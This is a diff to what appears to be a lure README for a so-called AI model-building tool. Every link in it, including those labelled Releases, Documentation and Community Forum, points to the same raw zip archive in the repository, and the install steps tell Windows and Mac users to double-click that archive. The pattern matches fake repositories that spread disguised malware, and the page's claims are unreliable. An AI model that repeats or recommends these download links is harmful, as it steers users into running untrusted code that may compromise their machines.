@@ -1,6 +1,6 @@
 # 🤖 FOUNDATION-AI-SOTA-MODEL - Build AI Models Effortlessly
 
-[![Download](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip%20Now-FOUNDATION--AI--SOTA--MODEL-brightgreen)](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip)
+[![Download](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip%20Now-FOUNDATION--AI--SOTA--MODEL-brightgreen)](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip)
 
 ## 📥 Introduction
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run the application:
 
    To get started, visit the Releases page where you can find our latest version. Click the link below:
 
-   [Visit Releases to Download](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip)
+   [Visit Releases to Download](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip)
 
 2. **Choose the Correct Version**
 
@@ -22,7 +22,7 @@ Follow these simple steps to download and run the application:
 
 3. **Download the Application**
 
-   Click on the version you want. You will see a list of files. For most users, download the file labeled "https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip" for Windows or "https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip" for Mac. Simply click on the file to begin the download.
+   Click on the version you want. You will see a list of files. For most users, download the file labeled "https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip" for Windows or "https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip" for Mac. Simply click on the file to begin the download.
 
 ## 💾 Download & Install
 
@@ -34,8 +34,8 @@ Once your download is complete, you are ready to install the application.
 
 2. **Install the Application**
 
-   - **Windows:** Double-click on `https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip`. Follow the on-screen instructions to complete the installation.
-   - **Mac:** Double-click on `https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip`, drag the application into your Applications folder, and then open it from there.
+   - **Windows:** Double-click on `https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip`. Follow the on-screen instructions to complete the installation.
+   - **Mac:** Double-click on `https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip`, drag the application into your Applications folder, and then open it from there.
 
 3. **Run the Application**
 
@@ -83,8 +83,8 @@ A: Please check the Issues section of the repository. You may find solutions the
 
 For further information, tutorials, and tips, check out the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip)
-- [Community Forum](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip)
+- [Documentation](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip)
 
 ## ✉️ Contact
 
@@ -92,4 +92,4 @@ If you have questions or need additional help, feel free to reach out via the Is
 
 Thank you for choosing FOUNDATION-AI-SOTA-MODEL. Happy modeling! 
 
-[Visit Releases to Download](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/FOUNDATION-AI-SOTA-MODEL.zip)
+[Visit Releases to Download](https://raw.githubusercontent.com/nouman1492/FOUNDATION-AI-SOTA-MODEL/main/manjak/A-MODEL-SOT-FOUNDATIO-2.6.zip)
